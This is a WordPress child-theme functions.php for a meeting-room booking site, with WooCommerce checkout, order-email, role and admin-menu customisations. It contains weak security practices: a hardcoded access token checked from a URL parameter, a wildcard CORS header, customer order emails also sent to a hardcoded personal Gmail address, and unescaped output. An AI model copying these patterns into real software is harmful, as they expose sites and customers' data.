<?php
/**
 * WP Template 2024 functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WP Template 2024
 * @since WP Template 2024 1.0
 */

 // Add Custom ACF Blocks
include_once get_stylesheet_directory() . '/blocks/blocks.php';

 // Add Custom Metabox
 include_once get_stylesheet_directory() . '/metabox/orders.php';

  // Add Custom Metabox
  include_once get_stylesheet_directory() . '/center_admin/center_admin.php';
  include_once get_stylesheet_directory() . '/new_booking/new_booking.php';
  include_once get_stylesheet_directory() . '/bookings/bookings.php';
  include_once get_stylesheet_directory() . '/payments/payments.php';
  include_once get_stylesheet_directory() . '/login/login.php';


// Add Shortcode
include_once get_stylesheet_directory() . '/posts/custom_posts.php';

 // Add API
 include_once get_stylesheet_directory() . '/api/v1.php';
 include_once get_stylesheet_directory() . '/api/v2.php';
 include_once get_stylesheet_directory() . '/api/utils.php';
 include_once get_stylesheet_directory() . '/api/JWT.php';

 // Add Custom Logo
include_once get_stylesheet_directory() . '/theme_assets/login_logo.php';

 // Add Sitemap Shortcode
 include_once get_stylesheet_directory() . '/theme_assets/sitemap.php';

  // Register Woocommerce Customer
  include_once get_stylesheet_directory() . '/woocommerce_customs/register.php';


 add_action( 'after_setup_theme', 'twentytwentythree_support', 9999 );

 if ( ! function_exists( 'twentytwentythree_support' ) ) :
 
	 /**
	  * Sets up theme defaults and registers support for various WordPress features.
	  */
	 function twentytwentythree_support() {
 
		 // Add support for block styles.
		 add_theme_support( 'wp-block-styles' );
 
		 // Enqueue editor styles.
		 add_editor_style( 'critical.css' );
		 add_editor_style( 'style.css' );
	 }
 
 endif;

// Load First the Google Fonts
add_action('wp_head', 'theme_fonts', 1);
function theme_fonts() { ?>
	<!-- <link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">

    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" fetchpriority="high" as="style"> -->

    <link rel="preload" href="<?php echo get_stylesheet_directory_uri(); ?>/critical.css" fetchpriority="high" as="style"/>
    <link id="child-theme-critical" rel="stylesheet" media="all" href="<?php echo get_stylesheet_directory_uri(); ?>/critical.css" fetchpriority="high"/>

<?php } 


// CHILD THEME LOAD SCRIPTS AND STYLES
add_action( 'wp_enqueue_scripts', 'child_theme_enqueue_scripts_styles' );

function child_theme_enqueue_scripts_styles() {

    $theme_version = wp_get_theme()->get( 'Version' );

    wp_enqueue_style( 'child-theme-style', get_stylesheet_directory_uri() . '/style.css', array(), $theme_version , 'all');
    wp_enqueue_style( 'child-theme-custom-woo-style', get_stylesheet_directory_uri() . '/assets/css/custom-woo-style.css', array(), $theme_version , 'all');
    wp_enqueue_style( 'child-theme-custom-forms-style', get_stylesheet_directory_uri() . '/assets/css/custom-forms-style.css', array(), $theme_version , 'all');
	wp_enqueue_style( 'child-theme-swiper-css',  'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css', array() , '11.0.4' , 'all');
	// Register and enqueue Magnific Popup CSS file
    wp_enqueue_style('magnific-popup', 'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.css', array(), '1.1.0', 'all');
	wp_enqueue_style('mobiscroll-style',  get_stylesheet_directory_uri() . '/mobiscroll/css/mobiscroll.jquery.min.css');


    wp_enqueue_script('child-theme-swiper-js',  'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js', array(), '11.0.4' , true );
	wp_enqueue_script('ajax-script', get_stylesheet_directory_uri() . '/assets/js/ajax-script.js', array('jquery'), '1.0', true);
	// Register and enqueue Magnific Popup JS file
	wp_enqueue_script('magnific-popup', 'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js', array('jquery'), '1.1.0', true);
	// Localize the script with the ajaxurl
	wp_localize_script('ajax-script', 'ajax_object', array('ajaxurl' => admin_url('admin-ajax.php')));
	wp_localize_script('ajax-script', 'ajax_api_object', array('ajax_api_url' => home_url().'/ayala/wp-json'));


	// Enqueue Select2
    wp_enqueue_script('select2-js', 'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js', array('jquery'), '4.1.0-rc.0', true);
	wp_enqueue_script('mobiscroll-script', get_stylesheet_directory_uri() . '/mobiscroll/js/mobiscroll.jquery.min.js', array('jquery'), null, true);
    // Enqueue Select2 CSS
    wp_enqueue_style('select2-css', 'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css');
	wp_enqueue_script('child-theme-javascript', get_stylesheet_directory_uri() . '/assets/js/custom' . '.js', [ 'jquery' ] , $theme_version , true );

}

// CHILD THEME BLOCK VARIATIONS
add_action( 'enqueue_block_editor_assets', 'child_theme_block_variations' );

function custom_admin_styles() {
    wp_enqueue_style('custom-admin-style', get_stylesheet_directory_uri() . '/admin-style.css');
    if (current_user_can('shop_manager')) {
        // Enqueue the custom style for shop managers
        wp_enqueue_style('shop-manager-style', get_stylesheet_directory_uri() . '/shop-manager-style.css');
    }
}
add_action('admin_enqueue_scripts', 'custom_admin_styles');


function child_theme_block_variations() {

    $theme_version = wp_get_theme()->get( 'Version' );

    /**
     * Create a custom class for different variants of a component.
     * eg. different types of buttons (Primary, Secondary).
     */
    wp_enqueue_script('child-theme-block-styles-variation', get_stylesheet_directory_uri() . '/assets/js/block-styles-variation' . '.js',  array(), $theme_version , true );
	// wp_enqueue_script('child-theme-block-variations', get_template_directory_uri() . '/assets/js/block-variation' . '.js', array() , $theme_version , true );
}

function custom_admin_style_enqueue() {
    wp_enqueue_style('custom-admin-style', get_stylesheet_directory_uri() . '/assets/css/admin-style.css');
	wp_enqueue_script('custom-admin-script', get_stylesheet_directory_uri() . '/assets/js/admin-custom.js', array('jquery'), '1.0', true);
}
add_action('admin_enqueue_scripts', 'custom_admin_style_enqueue');



// CHILD THEME LOAD SCRIPTS AND STYLES
// add_action( 'wp_enqueue_scripts', 'child_theme_enqueue_scripts_styles' );

// function child_theme_enqueue_scripts_styles() {

//     $theme_version = wp_get_theme()->get( 'Version' );

//     wp_enqueue_style( 'child-theme-style', get_template_directory_uri() . '/style.css', array(), $theme_version , 'all');

// 	// wp_enqueue_style( 'child-theme-swiper-css',  'https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.css', array() , '8.0.0' , 'all');
//     // wp_enqueue_style( 'child-theme-magnific-popup-css',  'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css', array() , '1.1.0' , 'all');
// 	// wp_enqueue_style( 'child-theme-font-awesome-6',  'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css', array() , 'all');

// 	wp_enqueue_script('child-theme-javascript', get_stylesheet_directory_uri() . '/assets/js/custom' . '.js', [ 'jquery' ] , $theme_version , true );
//     wp_enqueue_script('child-theme-jquery',  get_stylesheet_directory_uri() . '/jquery-ui/jquery-ui.min.js', array() , true );
//     // wp_enqueue_script('child-theme-swiper-js',  'https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.js', array(), '8.4.5' , true );
// 	// wp_enqueue_script('child-theme-magnific-popup-js',  'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js', array(), '1.1.0', true);
// }


// Shortcode [year]
add_shortcode('year', 'year_shortcode');
function year_shortcode($atts) {
	return date("Y");
}

/**
 * Register block styles.
 */

if ( ! function_exists( 'wptemplate2024_block_styles' ) ) :
	/**
	 * Register custom block styles
	 *
	 * @since WP Template 2024 1.0
	 * @return void
	 */
	function wptemplate2024_block_styles() {

		register_block_style(
			'core/details',
			array(
				'name'         => 'arrow-icon-details',
				'label'        => __( 'Arrow icon', 'wptemplate2024' ),
				/*
				 * Styles for the custom Arrow icon style of the Details block
				 */
				'inline_style' => '
				.is-style-arrow-icon-details {
					padding-top: var(--wp--preset--spacing--10);
					padding-bottom: var(--wp--preset--spacing--10);
				}

				.is-style-arrow-icon-details summary {
					list-style-type: "\2193\00a0\00a0\00a0";
				}

				.is-style-arrow-icon-details[open]>summary {
					list-style-type: "\2192\00a0\00a0\00a0";
				}',
			)
		);

		register_block_style(
			'core/post-terms',
			array(
				'name'         => 'pill',
				'label'        => __( 'Pill', 'wptemplate2024' ),
				/*
				 * Styles variation for post terms
				 * https://github.com/WordPress/gutenberg/issues/24956
				 */
				'inline_style' => '
				.is-style-pill a,
				.is-style-pill span:not([class], [data-rich-text-placeholder]) {
					display: inline-block;
					background-color: var(--wp--preset--color--base-2);
					padding: 0.375rem 0.875rem;
					border-radius: var(--wp--preset--spacing--20);
				}

				.is-style-pill a:hover {
					background-color: var(--wp--preset--color--contrast-3);
				}',
			)
		);
		register_block_style(
			'core/list',
			array(
				'name'         => 'checkmark-list',
				'label'        => __( 'Checkmark', 'wptemplate2024' ),
				/*
				 * Styles for the custom checkmark list block style
				 * https://github.com/WordPress/gutenberg/issues/51480
				 */
				'inline_style' => '
				ul.is-style-checkmark-list {
					list-style-type: "\2713";
				}

				ul.is-style-checkmark-list li {
					padding-inline-start: 1ch;
				}',
			)
		);
		register_block_style(
			'core/navigation-link',
			array(
				'name'         => 'arrow-link',
				'label'        => __( 'With arrow', 'wptemplate2024' ),
				/*
				 * Styles for the custom arrow nav link block style
				 */
				'inline_style' => '
				.is-style-arrow-link .wp-block-navigation-item__label:after {
					content: "\2197";
					padding-inline-start: 0.25rem;
					vertical-align: middle;
					text-decoration: none;
					display: inline-block;
				}',
			)
		);
		register_block_style(
			'core/heading',
			array(
				'name'         => 'asterisk',
				'label'        => __( 'With asterisk', 'wptemplate2024' ),
				'inline_style' => "
				.is-style-asterisk:before {
					content: '';
					width: 1.5rem;
					height: 3rem;
					background: var(--wp--preset--color--contrast-2, currentColor);
					clip-path: path('M11.93.684v8.039l5.633-5.633 1.216 1.23-5.66 5.66h8.04v1.737H13.2l5.701 5.701-1.23 1.23-5.742-5.742V21h-1.737v-8.094l-5.77 5.77-1.23-1.217 5.743-5.742H.842V9.98h8.162l-5.701-5.7 1.23-1.231 5.66 5.66V.684h1.737Z');
					display: block;
				}

				/* Hide the asterisk if the heading has no content, to avoid using empty headings to display the asterisk only, which is an A11Y issue */
				.is-style-asterisk:empty:before {
					content: none;
				}

				.is-style-asterisk:-moz-only-whitespace:before {
					content: none;
				}

				.is-style-asterisk.has-text-align-center:before {
					margin: 0 auto;
				}

				.is-style-asterisk.has-text-align-right:before {
					margin-left: auto;
				}

				.rtl .is-style-asterisk.has-text-align-left:before {
					margin-right: auto;
				}",
			)
		);
	}
endif;

add_action( 'init', 'wptemplate2024_block_styles' );

/**
 * Enqueue block stylesheets.
 */

if ( ! function_exists( 'wptemplate2024_block_stylesheets' ) ) :
	/**
	 * Enqueue custom block stylesheets
	 *
	 * @since WP Template 2024 1.0
	 * @return void
	 */
	function wptemplate2024_block_stylesheets() {
		/**
		 * The wp_enqueue_block_style() function allows us to enqueue a stylesheet
		 * for a specific block. These will only get loaded when the block is rendered
		 * (both in the editor and on the front end), improving performance
		 * and reducing the amount of data requested by visitors.
		 *
		 * See https://make.wordpress.org/core/2021/12/15/using-multiple-stylesheets-per-block/ for more info.
		 */
		wp_enqueue_block_style(
			'core/button',
			array(
				'handle' => 'wptemplate2024-button-style-outline',
				'src'    => get_parent_theme_file_uri( 'assets/css/button-outline.css' ),
				'ver'    => wp_get_theme( get_template() )->get( 'Version' ),
				'path'   => get_parent_theme_file_path( 'assets/css/button-outline.css' ),
			)
		);
	}
endif;

add_action( 'init', 'wptemplate2024_block_stylesheets' );

/**
 * Register pattern categories.
 */

if ( ! function_exists( 'wptemplate2024_pattern_categories' ) ) :
	/**
	 * Register pattern categories
	 *
	 * @since WP Template 2024 1.0
	 * @return void
	 */
	function wptemplate2024_pattern_categories() {

		register_block_pattern_category(
			'page',
			array(
				'label'       => _x( 'Pages', 'Block pattern category' ),
				'description' => __( 'A collection of full page layouts.' ),
			)
		);
	}
endif;

add_action( 'init', 'wptemplate2024_pattern_categories' );


// WOOCOMMERCE
// Remove fields
add_filter( 'woocommerce_checkout_fields', 'bbloomer_remove_woo_checkout_fields' );
  
function bbloomer_remove_woo_checkout_fields( $fields ) {
    unset( $fields['billing']['billing_address_1'] ); 
    unset( $fields['billing']['billing_address_2'] ); 
    unset( $fields['billing']['billing_city'] ); 
    unset( $fields['billing']['billing_postcode'] ); 
    unset( $fields['billing']['billing_state'] ); 
    return $fields;
}

// Reoder
// add_filter( 'woocommerce_default_address_fields', 'bbloomer_reorder_checkout_fields' );
 
// function bbloomer_reorder_checkout_fields( $fields ) {
 
//    // default priorities:
//    // 'first_name' - 10
//    // 'last_name' - 20
//    // 'company' - 30
//    // 'country' - 40
//    // 'address_1' - 50
//    // 'address_2' - 60
//    // 'city' - 70
//    // 'state' - 80
//    // 'postcode' - 90
 
//   // e.g. move 'company' above 'first_name':
//   // just assign priority less than 10
//   $fields['billing_email']['priority'] = 90;
 
//   return $fields;
// }

add_filter( 'woocommerce_billing_fields', 'bbloomer_move_checkout_email_field' );
 
function bbloomer_move_checkout_email_field( $address_fields ) {
    $address_fields['billing_email']['priority'] = 90;
    return $address_fields;
}

// CHANGE LABEL
add_filter( 'woocommerce_checkout_fields', 'bbloomer_rename_woo_checkout_fields' );
  
function bbloomer_rename_woo_checkout_fields( $fields ) {
    $fields['billing']['billing_phone']['label'] = 'Contact Number';
    $fields['billing']['billing_email']['label'] = 'Email Address';
    return $fields;
}

add_filter( 'woocommerce_checkout_fields', 'bbloomer_required_woo_checkout_fields' );
  
function bbloomer_required_woo_checkout_fields( $fields ) {
    $fields['billing']['billing_first_name']['required'] = false;
    return $fields;
}

// ADD FIELD
add_filter( 'woocommerce_checkout_fields', 'bbloomer_shipping_phone_checkout' );
 
function bbloomer_shipping_phone_checkout( $fields ) {
   $fields['billing']['billing_tin_number'] = array(
      'label' => 'TIN Number',
      'type' => 'tel',
      'required' => false,
      'class' => array( 'form-row-wide' ),
      'validate' => array( 'phone' ),
      'autocomplete' => 'tel',
      'priority' => 100,
   );
   return $fields;
}

// Add Booking Notes field on the checkout page
add_filter('woocommerce_checkout_fields', 'add_booking_notes_field');
function add_booking_notes_field($fields) {
    $fields['billing']['booking_notes'] = array(
        'type'        => 'textarea',
        'class'       => array('form-row-wide'),
        'label'       => __('Booking Notes'),
        'placeholder' => __('Some random notes here......'),
        'required'    => false,
        'clear'       => true,
    );

    return $fields;
}

  
add_action( 'woocommerce_admin_order_data_after_shipping_address', 'bbloomer_shipping_phone_checkout_display' );
 
function bbloomer_shipping_phone_checkout_display( $order ){
    echo '<p><b>Shipping Phone:</b> ' . get_post_meta( $order->get_id(), '_shipping_phone', true ) . '</p>';
}


function custom_excerpt_length($length) {
    return 20; // Change 20 to the number of words you want to show in the excerpt
}

function custom_excerpt_more($more) {
    return ''; // Remove the default "[...]"
}

add_filter('excerpt_length', 'custom_excerpt_length');
add_filter('excerpt_more', 'custom_excerpt_more');




function set_default_quantity_to_one( $cart ) {
    foreach ( $cart->get_cart() as $cart_item_key => $cart_item ) {
        $cart->set_quantity( $cart_item_key, 1 );
    }
}
add_action( 'woocommerce_cart_loaded_from_session', 'set_default_quantity_to_one' );


function hide_save_order_page($query) {
    global $pagenow;

    // Check if it's the admin pages list
    if ($pagenow === 'edit.php' && isset($_GET['post_type']) && $_GET['post_type'] === 'page') {
        $save_order_page_id = 680; // Replace with the actual page ID of your save-order page

        // Exclude the save-order page from the query
        $query->set('post__not_in', array($save_order_page_id));
    }
}
add_action('pre_get_posts', 'hide_save_order_page');







function add_query_vars_filter( $vars ){

    $vars[] = "formtoken";

    return $vars;

}

add_filter( 'query_vars', 'add_query_vars_filter' );

get_query_var('formtoken');



add_action('template_redirect', function(){



    /** You can change your token value here as you like. As long as it's long enough.  */

    $token = 'L1dsrqjQNca4Bado4M17I1iWPqZOLk69swvTxWkjN6tknx2C00JgJudIgb68Ul65c1eeO0Wmzoc6h7EdX2mdP';

    $tokenURL = get_query_var('formtoken');

    if ( ! is_page('thank-you') && ! is_page('check-out')) {
        return;
    }

    if ($token == $tokenURL) {

        return;

    }

    wp_redirect( get_home_url() );

    exit;

} );


add_filter( 'woocommerce_email_subject_customer_processing_order', 'bbloomer_change_processing_email_subject', 10, 2 );
  
function bbloomer_change_processing_email_subject( $subject, $order ) {
	$orders = wc_get_order($order->get_id());
    $first_item = current($orders->get_items());

   $subject = 'New Room Booking | '. $first_item->get_name();
   return $subject;
}

// Add a filter to modify the order email recipient
add_filter('woocommerce_email_recipient_customer_processing_order', 'custom_order_email_recipient', 10, 2);

function custom_order_email_recipient($recipient, $order) {

	// Get the customer email from the order object
    $customer_email = $order->get_billing_email();
	
    // Change the recipient to the custom email address
    $recipient = 'jmnicolas4me@gmail.com';

    // Uncomment the line below to keep the original recipient as well
    $recipient .= ',' . $customer_email;

    return $recipient;
}

add_filter('woocommerce_email_subject_new_order', 'custom_new_order_email_subject', 10, 2);

function custom_new_order_email_subject($subject, $order) {
	$orders = wc_get_order($order->get_id());
	$first_item = current($orders->get_items());
	$product_id = $first_item->get_product_id();
    // Customize the subject as needed
    $custom_subject = $subject.' | '.$first_item->get_name();

    return $custom_subject;
}

// add_filter( 'woocommerce_email_recipient_new_order', 'bbloomer_dynamic_recipient', 9999, 2 );
  
// function bbloomer_dynamic_recipient( $recipient, $order ) {
//    $email_recipient = 'jmnicolas4me@gmail.com';
//    return $email_recipient;
// }


add_action('woocommerce_order_status_changed', 'send_custom_email_notifications', 10, 4 );
function send_custom_email_notifications( $order_id, $old_status, $new_status, $order ){
    if ( $new_status == 'cancelled' || $new_status == 'failed' ){
        $wc_emails = WC()->mailer()->get_emails(); // Get all WC_emails objects instances
        $customer_email = $order->get_billing_email(); // The customer email
    }

    if ( $new_status == 'cancelled' ) {
        // change the recipient of this instance
        $wc_emails['WC_Email_Cancelled_Order']->recipient = $customer_email;
        // Sending the email from this instance
        $wc_emails['WC_Email_Cancelled_Order']->trigger( $order_id );
    } 
    elseif ( $new_status == 'failed' ) {
        // change the recipient of this instance
        $wc_emails['WC_Email_Failed_Order']->recipient = $customer_email;
        // Sending the email from this instance
        $wc_emails['WC_Email_Failed_Order']->trigger( $order_id );
    } 
}

add_shortcode('page_sitemap', 'page_sitemap');
function page_sitemap($atts = array()){
    $args = shortcode_atts(  array( 'exclude' => '' ), $atts);

    $atts = shortcode_atts(array(
        'id' => 'sitemap',
        'title' => false,
        'parent' => false, 
        'authors' => false,
        'depth' => false,
        'sort_solumn' => 'menu_order,post_title',
        'date_format' => 'j D Y',
        'show_date' => false,
        'exclude' => $args['exclude'],
        'link_before' => false,
        'link_after' => false,
        'poststatus' => false,
        'item_spacing' => false,
        'walker' => false,
        'list_style' => 'none',
    ), $atts);

    $parent = ($atts['parent'] !== false) ? $atts['parent'] : '0';
    $authors = ($atts['authors'] !== false) ? $atts['authors'] : '';
    $title = ($atts['title'] !== false) ? $atts['title'] : '';
    $depth = ($atts['depth'] !== false) ? $atts['depth'] : '0';
    $walker = ($atts['walker'] !== false) ? $atts['walker'] : '';
    $date = ($atts['show_date'] !== false) ? $atts['show_date'] : '';
    $exclude = ($atts['exclude'] !== false) ? $atts['exclude'] : '';
    $poststatus = ($atts['poststatus'] !== false) ? $atts['poststatus'] : 'publish';
    $spacing = ($atts['item_spacing'] === false) ? 'preserve' : 'discard';
    $link_after = ($atts['link_after'] !== false) ? $atts['link_after'] : '';
    $link_before = ($atts['link_before'] !== false) ? $atts['link_before'] : '';
    $sitemap = wp_list_pages('child_of=' . $parent . '&authors=' . $authors . '&title_li=' . $title . '&depth=' . $depth . '&sort_column=' . $atts['sort_solumn'] . '&walker=' . $walker . '&date=' . $date . '&exclude=' . $exclude . '&post_status=' . $poststatus . '&item_spacing=' . $spacing . '&link_after=' . $link_after . '&link_before=' . $link_before . '&echo=0');
    if ($sitemap != '') $sitemap = '<ul' . ($atts['id'] == '' ? '' : ' id="' . $atts['id'] . '"') . '>' . $sitemap . '</ul>';
    return '' . $sitemap . '';
}

function add_viewport_meta_tag() {
    echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">' . "\n";
}

add_action('wp_head', 'add_viewport_meta_tag');
add_action( 'admin_menu', 'rename_woocommerce_menu_and_icon', 999 );

function rename_woocommerce_menu_and_icon() 
{
    global $menu;

    // Pinpoint menu item
    $woo = recursive_array_search_php_91365( 'Products', $menu );

    // Validate
    if( !$woo )
        return;

    // Update the menu name and icon
    $menu[$woo][0] = 'Meeting Rooms';
    $menu[$woo][6] = 'dashicons-admin-home'; // Change this line to the desired dashicon class
}

// http://www.php.net/manual/en/function.array-search.php#91365
function recursive_array_search_php_91365( $needle, $haystack ) 
{
    foreach( $haystack as $key => $value ) 
    {
        $current_key = $key;
        if( 
            $needle === $value 
            OR ( 
                is_array( $value )
                && recursive_array_search_php_91365( $needle, $value ) !== false 
            )
        ) 
        {
            return $current_key;
        }
    }
    return false;
}




function add_cors_http_header(){
    header("Access-Control-Allow-Origin: *");
}
add_action('init','add_cors_http_header');


function restrict_author_change_to_administrator($data, $postarr) {
    // Check if the current user can manage options (typically only administrators)
    if (!current_user_can('manage_options')) {
        // If the post is being updated (not created), revert the post_author to the current author's ID
        if (!empty($postarr['ID'])) {
            $current_post = get_post($postarr['ID']);
            if ($current_post) {
                $data['post_author'] = $current_post->post_author;
            }
        }
    }
    return $data;
}
add_filter('wp_insert_post_data', 'restrict_author_change_to_administrator', 10, 2);


function remove_author_meta_box() {
    global $post;

    // Check if we are on the 'location' post type edit screen
    if ($post && 'location' === $post->post_type) {
        remove_meta_box('authordiv', 'location', 'normal');
    }
}
add_action('add_meta_boxes', 'remove_author_meta_box');


add_action('admin_menu', 'remove_built_in_roles');

function remove_built_in_roles() {
    global $wp_roles;

    $roles_to_remove = array('subscriber', 'contributor', 'author', 'editor', 'admin');

    foreach ($roles_to_remove as $role) {
        if (isset($wp_roles->roles[$role])) {
            $wp_roles->remove_role($role);
        }
    }
}

function add_last_login_time_field($user) {
    update_user_meta($user->ID, 'last_login_time', current_time('mysql'));
}
add_action('wp_login', 'add_last_login_time_field');

function add_custom_user_meta_fields($user) {
    ?>
    <h3>Extra profile information</h3>
    <table class="form-table">
        <tr>
            <th><label for="last_login_time">Last Login Time</label></th>
            <td>
                <input type="text" name="last_login_time" id="last_login_time" value="<?php echo esc_attr(get_the_author_meta('last_login_time', $user->ID)); ?>" class="regular-text" readonly/><br />
                <span class="description">This is the last login time of the user.</span>
            </td>
        </tr>
    </table>
    <?php
}
add_action('show_user_profile', 'add_custom_user_meta_fields');
add_action('edit_user_profile', 'add_custom_user_meta_fields');


add_filter('woocommerce_before_order_object_save', 'prevent_order_status_change', 10, 2);

function prevent_order_status_change($order, $data_store) {
    // Get the old order status
    $old_status = $order->get_status();
    
    // Get the new order status
    $new_status = isset($_POST['order_status']) ? sanitize_text_field($_POST['order_status']) : $old_status;

    // Only proceed if the status is being changed
    if ($old_status !== $new_status) {
        // Get the checkin and checkout custom fields
        $checkin = get_field('checkin', $order->get_id());
        $checkout = get_field('checkout', $order->get_id());

        if ($checkin && $checkout) {
            // Convert the checkin and checkout dates to DateTime objects
            $order_checkin_date = new DateTime($checkin, new DateTimeZone('Asia/Manila'));
            $order_checkout_date = new DateTime($checkout, new DateTimeZone('Asia/Manila'));

            // Get the current date
            $current_date = new DateTime('now', new DateTimeZone('Asia/Manila'));

            // Check if the start date or end date is before or equal to the current date
            if ($order_checkin_date <= $current_date || $order_checkout_date <= $current_date) {
                throw new Exception(sprintf(__('You are not allowed to change order from %s to %s as the booked slot has passed.', 'woocommerce'), $old_status, $new_status));
                return false;
            }
        } else {
            throw new Exception(__('Checkin or checkout date is missing.', 'woocommerce'));
        }
    }

    return $order;
}


add_action('admin_init', 'log_console_if_order_status_change_prevented');

function log_console_if_order_status_change_prevented() {
    global $pagenow;
   
    // Check if we are on the edit order page
    if ($pagenow === 'admin.php' && isset($_GET['page']) && $_GET['page'] == 'wc-orders') {
        $order_id = $_GET['id'];
        
        // Get the checkin and checkout custom fields
        $checkin = get_field('checkin', $order_id);
        $checkout = get_field('checkout', $order_id);

        if ($checkin && $checkout) {

            // Convert checkin and checkout to JavaScript Date format
            $order_checkin_date = new DateTime($checkin);
            $order_checkout_date = new DateTime($checkout);

            // Get the current date
            $current_date = new DateTime('now', new DateTimeZone('Asia/Manila'));

            // Calculate the date 2 days before the checkin and checkout dates
            $checkin_minus_2_days = (clone $order_checkin_date)->sub(new DateInterval('P2D'));
            $checkout_minus_2_days = (clone $order_checkout_date)->sub(new DateInterval('P2D'));

            // Check if the start date or end date is before or equal to the current date
            if ($checkin_minus_2_days <= $current_date || $checkout_minus_2_days <= $current_date) {
                // Output JavaScript directly in the admin header
                ?>
                <script type="text/javascript">
                    document.addEventListener('DOMContentLoaded', function() {
                        var orderStatusSelect = document.getElementById('order_status');
                        if (orderStatusSelect) {
                            orderStatusSelect.disabled = true;
                        }
                    });
                </script>
                <?php
            }
        }
    }
}


function add_center_admin_metabox() {
    add_meta_box(
        'center_admin_accounts',        // Unique ID
        'Center Admin Accounts',        // Box title
        'center_admin_metabox_html',    // Content callback, must be of type callable
        'location',                     // Post type
        'normal',                       // Context (position in the screen)
        'high'                          // Priority (high ensures it's at the top)
    );
}
add_action('add_meta_boxes', 'add_center_admin_metabox');



function center_admin_metabox_html($post) { 
    function get_users_by_location($location_id) {
        // Define the query arguments
        $args = array(
            'meta_key' => 'location', // The meta key for the ACF field
            'meta_value' => $location_id, // The value you want to match
            'meta_compare' => '=', // Comparison operator
        );
    
        // Perform the user query
        $user_query = new WP_User_Query($args);
    
        // Get the results
        $users = $user_query->get_results();
    
        // Array to store unique emails and display names
        $unique_users = [];
        $seen_emails = [];
    
        // Check for results
        if (!empty($users)) {
            // Loop through each user
            foreach ($users as $user) {
                $email = $user->user_email;
                $display_name = $user->display_name;
    
                // Check if the email is not in the set of seen emails
                if (!in_array($email, $seen_emails)) {
                    // Add the user details to the unique users array
                    $unique_users[] = [
                        'email' => $email,
                        'display_name' => $display_name
                    ];
                    // Mark the email as seen
                    $seen_emails[] = $email;
                }
            }
        }
        return $unique_users;
    }

    $unique_users = get_users_by_location($post->ID);
    
    ?>

    <figure class="wp-block-table is-style-stripes">
        <table class="has-fixed-layout">
            <thead>
                <tr>
                    <th><strong>Center Admin Name</strong></th>
                    <th><strong>Email</strong></th>
                </tr>
            </thead>
            <tbody>
            <?php
                // Output the distinct emails and display names
                if (!empty($unique_users)) {
                    foreach ($unique_users as $user) {
                        ?>
                            
                            <tr>
                                <td><?php echo $user['display_name']; ?></td>
                                <td><?php echo $user['email']; ?></td>
                            </tr>
                                       
                        <?php
                    }
                } else {
                    ?>
                        <td colspan="2" align="center" style="padding: 1.5rem;">No center admin accounts found for this location.</td>
                    <?php
                }

                ?>
            </tbody>
        </table>
    </figure>
    <?php
    
}


function redirect_all_users_to_login() {
    // Check if the current request is not the login page or admin area
    if ( ! ( is_page('login') || is_page('wp-login.php') || is_admin() ) ) {
        // Redirect to the login page
        wp_redirect( home_url('/wp-admin') );
        exit();
    }
}
add_action('template_redirect', 'redirect_all_users_to_login');


add_filter('woocommerce_customer_meta_fields', 'remove_woocommerce_user_fields');

function remove_woocommerce_user_fields($fields) {
    // Unset the fields you want to remove
    unset($fields['billing']['fields']['billing_first_name']);
    unset($fields['billing']['fields']['billing_last_name']);
    unset($fields['billing']['fields']['billing_company']);
    unset($fields['billing']['fields']['billing_address_1']);
    unset($fields['billing']['fields']['billing_address_2']);
    unset($fields['billing']['fields']['billing_city']);
    unset($fields['billing']['fields']['billing_postcode']);
    unset($fields['billing']['fields']['billing_country']);
    unset($fields['billing']['fields']['billing_state']);
    unset($fields['billing']['fields']['billing_phone']);
    unset($fields['billing']['fields']['billing_email']);
    
    unset($fields['shipping']['fields']['shipping_first_name']);
    unset($fields['shipping']['fields']['shipping_last_name']);
    unset($fields['shipping']['fields']['shipping_company']);
    unset($fields['shipping']['fields']['shipping_address_1']);
    unset($fields['shipping']['fields']['shipping_address_2']);
    unset($fields['shipping']['fields']['shipping_city']);
    unset($fields['shipping']['fields']['shipping_postcode']);
    unset($fields['shipping']['fields']['shipping_country']);
    unset($fields['shipping']['fields']['shipping_state']);
    unset($fields['shipping']['fields']['shipping_phone']);
    unset($fields['additional']['fields']['_additional_phone']);
    
    return $fields;
}


// Add custom column to user table
function add_company_name_column($columns) {
    $columns['company_name'] = 'Company Name';
    return $columns;
}
add_filter('manage_users_columns', 'add_company_name_column');

// Populate custom column with user meta value
function show_company_name_column_content($value, $column_name, $user_id) {
    if ($column_name == 'company_name') {
        $company_name = get_user_meta($user_id, 'company_name', true);
        return esc_html($company_name);
    }
    return $value;
}
add_filter('manage_users_custom_column', 'show_company_name_column_content', 10, 3);

// Make custom column sortable (optional)
function sortable_company_name_column($columns) {
    $columns['company_name'] = 'company_name';
    return $columns;
}
add_filter('manage_users_sortable_columns', 'sortable_company_name_column');

// Handle sorting for the custom column
function sort_company_name_column($query) {
    if (!is_admin()) return;

    $orderby = $query->get('orderby');
    if ('company_name' == $orderby) {
        $query->set('meta_key', 'company_name');
        $query->set('orderby', 'meta_value');
    }
}
add_action('pre_get_users', 'sort_company_name_column');


